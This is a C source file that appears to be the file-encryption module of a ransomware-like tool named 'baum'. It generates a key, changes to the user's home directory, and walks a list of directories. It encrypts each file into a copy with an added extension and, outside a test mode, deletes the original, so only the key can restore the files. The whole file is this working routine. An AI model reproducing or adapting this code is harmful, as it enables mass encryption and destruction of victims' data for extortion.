#include "encrypt.h"

#include <string.h>
#include <unistd.h>
#include <linux/limits.h>

#include "baumcommon.h"
#include "baumcrypt.h"

int baum_createkey(const char *keyfile) {

	bp("Creating key and writing to '%s'", keyfile);

	unsigned char key[BAUMCRYPT_KEYLEN];
	int hret = baumcrypt_makekey(key);
	if (hret != 0) {
		return 1;
	}

	hret = helper_putfile(keyfile, BAUMCRYPT_KEYLEN, key);
	if (hret != 0) {
		return 1;
	}

	return 0;
}

typedef struct {
	unsigned char *key;
	const char *extension;
} tmp_helper;

int encrypt_file(const char* name, void *arg) {
	int hret = 0;

	unsigned char *key = ((tmp_helper*)arg)->key;
	const char *extension = ((tmp_helper*)arg)->extension;

	size_t name_strlen = strlen(name);
	size_t ext_strlen = strlen(extension);

	if (name_strlen + ext_strlen >= PATH_MAX) {
		bp("name would be longer than PATH_MAX");
		return 1;
	}

	if (name_strlen >= ext_strlen) {
		size_t orig_len = name_strlen - ext_strlen;
		const char *file_ext = name + orig_len;
		if (memcmp(file_ext, extension, ext_strlen) == 0) {
			bp("already encrypted");
			return 1;
		}
	}

	char name_new[PATH_MAX];
	memcpy(name_new, name, name_strlen);
	memcpy(name_new + name_strlen, extension, ext_strlen + 1);

	bp("encrypting: '%s' into '%s'", name, name_new);

	hret = baumcrypt_encrypt(name, name_new, key);
	if (hret != 0) {
		bp("encryption failed");
		return 1;
	}

	if (!baumcommon_test) {
		hret = unlink(name);
		if (hret != 0) {
			bp("unlink failed");
		} else {
			bp("deleted '%s'", name);
		}
	}

	return 0;
}

int decrypt_file(const char* name, void *arg) {
	int hret = 0;

	unsigned char *key = ((tmp_helper*)arg)->key;
	const char *extension = ((tmp_helper*)arg)->extension;

	size_t name_strlen = strlen(name);
	size_t ext_strlen = strlen(extension);

	if (name_strlen >= PATH_MAX) {
		bp("name longer than PATH_MAX");
		return 1;
	}

	if (name_strlen < ext_strlen) {
		return 1;
	}

	size_t orig_len = (name_strlen - ext_strlen);
	const char *file_ext = name + orig_len;
	if (memcmp(file_ext, extension, ext_strlen) != 0) {
		return 1;
	}

	char name_new[PATH_MAX];
	memcpy(name_new, name, orig_len);
	name_new[orig_len] = '\0';

	bp("decrypting: '%s' into '%s'", name, name_new);

	hret = baumcrypt_decrypt(name, name_new, key);
	if (hret != 0) {
		bp("decryption failed");
		return 1;
	}

	if (!baumcommon_test) {
		hret = unlink(name);
		if (hret != 0) {
			bp("unlink failed");
		} else {
			bp("deleted '%s'", name);
		}
	}

	return 0;
}

static int helper(const char *directories[], const char *extension,
	const char *keyfile, char mode_encrypt) {

	int hret = 0;

	bp("Using the keyfile '%s'", keyfile);

	unsigned char key[BAUMCRYPT_KEYLEN];
	FILE *f = fopen(keyfile, "rb");
	if (!f) {
		bp("cannot open keyfile");
		return 1;
	}
	hret = fread(key, BAUMCRYPT_KEYLEN, 1, f);
	if (hret != 1) {
		bp("cannot read keyfile");
	}

	hret = helper_chdir_home();
	if (hret != 0) {
		return 1;
	}

	for (int i = 0 ; directories[i] != NULL ; i++) {
		tmp_helper arg = {key, extension};
		hret = helper_list(directories[i],
			(mode_encrypt ? encrypt_file : decrypt_file),
			&arg);
		if (hret != 0) { }
	}

	return 0;
}

int baum_encrypt(const char *directories[], const char *extension,
	const char *keyfile) {

	bp("Encrypting");
	return helper(directories, extension, keyfile, 1);
}

int baum_decrypt(const char *directories[], const char *extension,
	const char *keyfile) {

	bp("Decrypting");
	return helper(directories, extension, keyfile, 0);
}

